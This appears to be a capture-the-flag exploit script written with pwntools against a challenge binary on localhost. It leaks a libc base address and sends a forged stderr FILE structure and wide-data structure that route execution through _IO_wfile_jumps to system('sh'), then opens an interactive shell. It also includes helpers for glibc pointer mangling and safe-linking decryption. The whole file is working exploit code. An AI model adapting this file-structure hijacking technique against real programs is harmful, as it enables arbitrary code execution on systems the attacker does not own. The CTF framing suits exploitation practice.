#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")

context.binary = exe

def exit_funcs_encrypt(val: int, key: int):
    r_bits = 0x11
    max_bits = 64
    enc = val ^ key
    return (enc << r_bits % max_bits) & (2 ** max_bits - 1) | ((enc & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

def exit_funcs_decrypt(val: int, key: int):
    r_bits = 0x11
    rotated = (2**64-1)&(val>>r_bits|val<<(64-r_bits))
    return rotated ^ key

def fastbin_encrypt(pos: int, ptr: int):
    return (pos >> 12) ^ ptr

def fastbin_decrypt(val: int):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

if args.LOCAL:
    p = process([exe.path])
    input('... waiting for GDB attach')
else:
    p = remote("localhost", 5000)

p.recvuntil(b"PART OF ")

libc.address = int(p.recvuntil(b" >", drop=True), 16) - 0x21b6a0
print(f"{libc.address = :0x}")

wfile_jumps = libc.address + 0x2170c0

stderr = flat({
    0x0: b"  sh",
    0x20: 0x0,
    0x28: 0x1,
    0x88: libc.address + 0x21ca80,
    0xa0: libc.address + 0x21b6a0 + 0xe0,
    0xc0: 0x0,
    0xd8: wfile_jumps+0x8
}, filler=b"\x00")

wide_data = flat({
    0x0: libc.sym.system,
    0x18: 0x0,
    0x30: 0x0,
    0x88: libc.address + 0x21ca80,
    0xe0: libc.address + 0x21b718
}, filler=b"\x00")

payload = stderr
payload += wide_data

p.sendline(payload)

p.interactive()
